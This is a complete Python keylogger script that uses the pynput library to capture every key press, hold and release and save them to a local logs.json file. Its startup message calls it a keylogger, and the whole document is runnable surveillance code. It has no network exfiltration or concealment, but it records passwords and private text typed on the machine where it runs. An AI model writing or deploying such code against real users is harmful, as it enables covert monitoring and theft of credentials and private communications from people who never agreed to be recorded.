from pynput import keyboard
import json

key_list = []
x = False


def update_json_file(key_list):
    with open('logs.json', 'w') as key_logs:
        json.dump(key_list, key_logs, indent=4)


def get_key_name(key):
    try:
        return key.char  
    except AttributeError:
        return str(key)  


def on_press(key):
    global x, key_list

    key_name = get_key_name(key)

    if not x:
        key_list.append({'Pressed': key_name})
        x = True
    else:
        key_list.append({'Held': key_name})

    update_json_file(key_list)


def on_release(key):
    global x, key_list

    key_name = get_key_name(key)

    key_list.append({'Released': key_name})
    x = False

    update_json_file(key_list)

print("[+] Running Keylogger successfully!")
print("[!] Saving the keys logs in 'logs.json'")

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
